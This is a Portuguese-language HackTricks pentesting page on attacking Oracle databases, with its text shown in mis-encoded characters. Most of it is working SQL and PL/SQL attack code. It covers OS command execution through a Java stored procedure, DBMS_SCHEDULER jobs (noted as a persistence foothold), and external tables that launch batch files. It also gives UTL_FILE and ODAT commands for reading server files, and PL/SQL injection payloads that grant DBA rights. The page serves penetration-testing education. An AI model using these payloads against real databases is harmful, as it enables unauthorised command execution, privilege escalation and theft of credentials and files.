<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# RCE: Java Store Procedure

Ent√£o, imagine que voc√™ tenha as informa√ß√µes da conta de administrador. Nesse caso, uma maneira muito popular de executar seu comando no servidor √© escrever uma procedimento armazenado em Java. Isso √© feito em tr√™s etapas. Primeiro, crie uma classe Java chamada 'oraexec'. Para fazer isso, conecte-se via terminal 'sqlplus' e escreva:
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
  public class oraexec
  {
    public static void execCommand(String command) throws IOException
    {
      Runtime.getRuntime().exec(command);
    }
  }
/
 
```
Em seguida, escreva um inv√≥lucro PL/SQL para esta classe:
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
Isso √© tudo. Agora, para executar um comando, tudo o que voc√™ precisa fazer √© enviar a seguinte consulta:
```text
exec javacmd('command');
```
Observe que ao usar o procedimento acima, n√£o podemos ver os resultados do comando executado, no entanto, voc√™ pode redirecionar a sa√≠da para um arquivo e l√™-lo. Voc√™ pode encontrar o c√≥digo completo do shell que permite ler e escrever arquivos:

{% file src="../../.gitbook/assets/raptor\_oraexec.sql" %}

No entanto, h√° um \[script mais sofisticado\] \(goo.gl/EuwPRU\) que lida com a sa√≠da do comando, mas tem um tamanho maior [aqui](https://oracle-base.com/articles/8i/shell-commands-from-plsql).

# RCE: Agendador

O pr√≥ximo m√©todo, que nos ajudar√° se n√£o houver uma m√°quina virtual Java, √© usar o 'dbmsscheduler', o agendador de tarefas integrado do Oracle. Para us√°-lo, voc√™ deve ter o privil√©gio 'CREATE EXTERNAL JOB'. Aqui est√° um exemplo de c√≥digo que implementa a entrada da string '0wned' em um arquivo de texto na raiz da unidade C:
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE); 
```
Isso criar√° e executar√° um trabalho para executar seu comando. E aqui est√° uma op√ß√£o para chamar o Agendador de outro procedimento - 'SYS.KUPP$PROC.CREATE\_MASTER\_PROCESS', que nos interessa principalmente, porque permite incorporar consultas de v√°rias instru√ß√µes, ou seja, aquelas que consistem em v√°rias subconsultas. Teoricamente, voc√™ pode executar tal consulta mesmo em caso de inje√ß√£o em um aplicativo da web.
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
Observe que, ao usar o Agendador, voc√™ pode executar esta tarefa mais de uma vez e com alguma frequ√™ncia. Como resultado, isso ajudar√° voc√™ a obter uma posi√ß√£o de entrada no sistema testado, porque, mesmo que o administrador exclua o usu√°rio do SO, este trabalho, que est√° sendo executado regularmente no sistema, o trar√° de volta √† vida.

# RCE: Tabelas Externas

Como √∫ltimo m√©todo para alcan√ßar a execu√ß√£o de comandos do SO, gostaria de mencionar o uso de Tabelas Externas. Este m√©todo ajudar√° voc√™ a baixar arquivos do servidor posteriormente. Voc√™ precisar√° das seguintes permiss√µes:

* UTL\_FILE;
* CREATE TABLE;
* um diret√≥rio reservado para o usu√°rio.

Lembre-se de que o acesso ao pacote 'UTL\_FILE' √© fornecido por padr√£o a todas as contas com a fun√ß√£o 'CONNECT'. Passo um: Verifique os diret√≥rios emitidos com a seguinte consulta:
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;
 
TABLE_NAME
------------------------------
ALICE_DIR
```
Passo dois: Crie um arquivo de lote execut√°vel com o comando desejado:
```text
declare
 f utl_file.file_type;
 s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
 f := utl_file.fopen('ALICE_DIR','test.bat','W');
 utl_file.put_line(f,s);
 utl_file.fclose(f);
end;
/
```
Passo tr√™s: Prepare a tabela externa 'EXTT', voc√™ precisar√° dela para executar o arquivo:
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
  DEFAULT DIRECTORY ALICE_DIR
  ACCESS PARAMETERS
  ( RECORDS DELIMITED BY NEWLINE
    FIELDS TERMINATED BY ',')
  LOCATION (alice_dir:'test.bat'))
/
```
Agora, basta chamar o seu arquivo em lote com o seguinte comando:
```text
SELECT * from EXTT;
```
O terminal come√ßar√° a exibir mensagens de erro que o sistema n√£o pode corresponder √† tabela e ao arquivo invocado, mas, neste caso, n√£o √© importante, j√° que o objetivo principal era abrir o arquivo execut√°vel, o que foi alcan√ßado.

A ferramenta 'ODAT.py' tamb√©m pode implementar esse ataque. No entanto, ela requer o privil√©gio 'CREATE ANY DIRECTORY', que, por padr√£o, √© concedido apenas √† fun√ß√£o DBA, j√° que tenta executar o arquivo de qualquer diret√≥rio e n√£o apenas "seu" diret√≥rio.

# Ler/Escrever arquivos

Agora, vamos prosseguir para a tarefa de ler e escrever arquivos. Se voc√™ simplesmente precisa ler ou escrever um arquivo no servidor, pode faz√™-lo sem nenhuma procedimento Java, que, no entanto, tamb√©m pode lidar com essas tarefas. Vamos dar uma olhada no pacote 'UTL_FILE', que possui a funcionalidade necess√°ria para trabalhar com o sistema de arquivos. A boa not√≠cia √© que, por padr√£o, ele pode ser acessado por todos os usu√°rios com a fun√ß√£o 'PUBLIC'. A m√° not√≠cia √© que, por padr√£o, esse procedimento n√£o tem acesso a todo o sistema de arquivos, mas apenas a um diret√≥rio pr√©-definido pelo administrador. No entanto, n√£o √© incomum encontrar um par√¢metro de diret√≥rio especificado como '*', o que significa literalmente "acesso a tudo". Voc√™ pode descobrir isso usando o seguinte comando:
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
Encontrei que o procedimento mais curto para usar o pacote 'UTL_FILE' √© proposto por Alexander Polyakov:
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/‚Äô,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/
 
```
Se voc√™ precisa de mais funcionalidade com a capacidade de escrever, recomendo pesquisar um script chamado 'raptor_oraexec.sql'. E, de acordo com a tradi√ß√£o, aqui est√° uma op√ß√£o para usar a ferramenta 'ODAT', que, como sempre, √© a mais curta:
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
O pacote 'UTL_FILE' tamb√©m √© muito interessante, pois se tiver sorte, voc√™ pode acessar os logs, arquivos de configura√ß√£o e obter senhas de contas privilegiadas, como 'SYS'.

O segundo m√©todo que gostaria de mencionar √© usar novamente as 'Tabelas Externas'. Lembre-se de que, ao usar 'Tabelas Externas', o banco de dados pode acessar em modo de leitura os dados das tabelas externas. Para um hacker, isso significa mais uma oportunidade de baixar arquivos do servidor, mas esse m√©todo requer o privil√©gio 'CREATE ANY DIRECTORY'. Sugiro usar imediatamente o 'ODAT', pois √© est√°vel e r√°pido:
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# Eleva√ß√£o de Privil√©gios

Voc√™ pode usar v√°rios m√©todos para elevar privil√©gios, desde cl√°ssicos buffer overflows e patching de DLL at√© ataques especializados contra bancos de dados, como inje√ß√µes PL/SQL. O t√≥pico √© muito extenso e, neste artigo, n√£o vou me aprofundar, pois isso √© discutido em grandes trabalhos de pesquisa, como os encontrados nos blogs de \[Lichfield\] \(goo.gl/IebQN4\) e \[Finnigan\] \(goo.gl/vXhttf\). Apenas demonstrarei alguns deles, para que voc√™ tenha uma ideia geral. Durante os testes, recomendo prestar aten√ß√£o √†s permiss√µes atuais e, com base nisso, procurar brechas desejadas na Internet.

Ao contr√°rio do MS SQL, onde um invasor pode injetar 'xp\_cmdshell' quase imediatamente ap√≥s 'SELECT' simplesmente fechando-o com uma aspa, o Oracle DB rejeita categoricamente tais truques. Por esse motivo, n√£o podemos recorrer sempre a inje√ß√µes SQL cl√°ssicas, embora, nesse caso, tamb√©m seja poss√≠vel encontrar uma sa√≠da. Vamos considerar inje√ß√µes PL/SQL, que modificam o processo de execu√ß√£o de uma procedimento \(fun√ß√£o, trigger e outros objetos\) incorporando comandos aleat√≥rios em par√¢metros de entrada dispon√≠veis. \(—Å\) Sh2kerr

Para incorporar a carga √∫til, encontre uma fun√ß√£o em que os par√¢metros de entrada n√£o sejam filtrados. Lembre-se de que o Oracle SQL n√£o permite consultas de v√°rias declara√ß√µes \(m√∫ltiplas\), portanto, provavelmente, voc√™ precisar√° usar alguns procedimentos "especiais" que tenham essa funcionalidade. A ideia principal por tr√°s do ataque √© a seguinte: por padr√£o, a menos que seja especificado o contr√°rio, o procedimento √© executado em nome do propriet√°rio e n√£o em nome do usu√°rio que o iniciou. Em outras palavras, se um procedimento de propriedade da conta 'SYS' estiver dispon√≠vel para execu√ß√£o e voc√™ puder incorporar seu c√≥digo nele, sua carga √∫til tamb√©m ser√° executada no contexto da conta 'SYS'. Como j√° mencionei, isso nem sempre acontece, pois existem procedimentos com o par√¢metro 'authid current\_user', o que significa que esse procedimento ser√° executado com os privil√©gios do usu√°rio atual. No entanto, geralmente em cada vers√£o, voc√™ pode encontrar algumas fun√ß√µes que s√£o vulner√°veis ‚Äã‚Äã√† inje√ß√£o PL/SQL. Uma vis√£o geral desse processo √© mostrada na Fig. 2.

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

Em resumo, em vez do argumento leg√≠timo esperado, passamos algum c√≥digo malicioso que se torna parte do procedimento. Um bom exemplo √© fornecido pela fun√ß√£o 'CTXSYS.DRILOAD'. √â executado em nome de 'CTXSYS' e n√£o filtra o par√¢metro de entrada, o que permite que voc√™ suba facilmente para DBA:
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
No entanto, isso provavelmente j√° √© hist√≥ria, uma vez que a vulnerabilidade foi encontrada em 2004 e afeta apenas as vers√µes antigas 8-9. Geralmente, o processo de escalonamento de privil√©gios √© dividido em duas partes: escrever o procedimento que aumenta os direitos e realizar a pr√≥pria inje√ß√£o. Um procedimento t√≠pico √© o seguinte:
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
Agora podemos injetar um procedimento como argumento da fun√ß√£o vulner√°vel (exemplo para vers√µes 10x):
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 ‚Äì-');
```
Nas vers√µes n√£o muito recentes 10 e 11, h√° uma "boa" exce√ß√£o, ou melhor, uma vulnerabilidade, que permite executar comandos no servidor sem ter direitos de DBA: o procedimento 'DBMS\_JVM\_EXP\_PERMS' permite que um usu√°rio com privil√©gio 'CREATE SESSION' obtenha direitos de 'JAVA IO'. O ataque pode ser montado da seguinte forma:
```text
SQL&gt; DECLARE
   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
   CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
  BEGIN
  OPEN C1;
  FETCH C1 BULK COLLECT INTO POL;
  CLOSE C1;
  DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
  END;
  /
 
PL/SQL procedure successfully completed.
```
Agora que voc√™ tem privil√©gios para chamar procedimentos Java, voc√™ pode evocar uma resposta do interpretador do Windows e executar algo:
```text
SQL&gt; select dbms_java.runjava(‚Äòoracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack‚Äô)from dual;
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
